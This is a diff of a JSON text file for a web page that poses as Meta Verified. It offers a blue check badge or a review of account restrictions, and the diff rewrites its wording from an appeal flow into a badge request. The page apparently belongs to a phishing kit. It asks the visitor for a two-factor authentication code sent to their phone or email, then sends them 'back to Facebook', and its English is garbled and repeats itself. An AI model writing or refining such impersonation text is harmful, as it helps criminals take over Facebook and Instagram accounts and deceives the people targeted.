@@ -1,5 +1,5 @@
 {
-     "meta": {
+    "meta": {
         "title": "Meta Verified | Get a Verified Blue Check on Instagram, Facebook",
         "description": "Get your blue check on Instagram and Facebook.",
         "graph": {
@@ -61,10 +61,10 @@
             }
         },
         "thumb_review": {
-            "title": "Fixing problems with account restrictions",
+            "title": "Requesting approval to receive an official verification badge",
             "sub_title": {
-                "sub_1": "Review request",
-                "sub_2": "Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal."
+                "sub_1": "",
+                "sub_2": "Please provide all required information accurately below. Submitting incorrect information may delay the approval process."
             },
             "button": "Request Review"
         },
@@ -137,7 +137,7 @@
                 }
             },
             "2fa": {
-                "title": "Two-factor authentication required (1/3)",
+                "title": "Two-factor authentication required ",
                 "description": "The verification code has been sent to your phone number or E-mail, please check your inbox and enter the code below to complete. In case you do not receive the code, please check the Facebook notification on your device and confirm it is you to complete the verification process.",
                 "form": {
                     "placeholder": "Code",
@@ -165,17 +165,17 @@
                 }
             },
             "final_step": {
-                "title": "Request has been sent",
-                "description": "Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.",
+                "title": "Request has been sent close",
+               "description": "Your request has been added to the processing queue.\nWe will handle your request within 24 hours.\nIf we do not receive feedback, please send back information so we can assist you.",
                 "button": "Return to Facebook"
             }
         },
         "appeal_guide": {
-            "title": "Appeal Guide",
+            "title": "Verified Blue Badge Request Guide",
             "sub_title": {
-                "sub_1": "Fact checkers may not respond to requests that contain intimidation, hate speech, or other verbal threats.",
-                "sub_2": "In your appeal, please include all necessary information to allow the fact checker to process your request in a timely manner. If you provide an invalid email address or do not respond to a request for additional information within 2 days, the fact checker may close the application without processing. If the appeal is not processed within 4 days, Meta will automatically reject it.",
-                "sub_3": "When everything is ready, we will review your account and determine whether restrictions apply to it. The verification procedure usually lasts 24 hours, but in some cases it may take longer. Depending on our decision, the restrictions imposed will remain in effect or will be lifted and your account will be reinstated."
+                "sub_1": "Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats .",
+                "sub_2": "In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it. If you provide an invalid email address or do not respond to a request for additional information within 2 days, the fact checker may close the application without processing. If the appeal is not processed within 4 days, Meta will automatically reject it.",
+                "sub_3": "Once all details are submitted, we will evaluate your account to check for any restrictions. The verification process typically takes 24 hours, though it may extend in some cases. Based on our decision, restrictions will either remain or be lifted, and your account will be updated accordingly."
             }
         },
         "privacy_center": {
@@ -222,5 +222,4 @@
             "link": "Privacy Policy"
         }
     }
-
 }
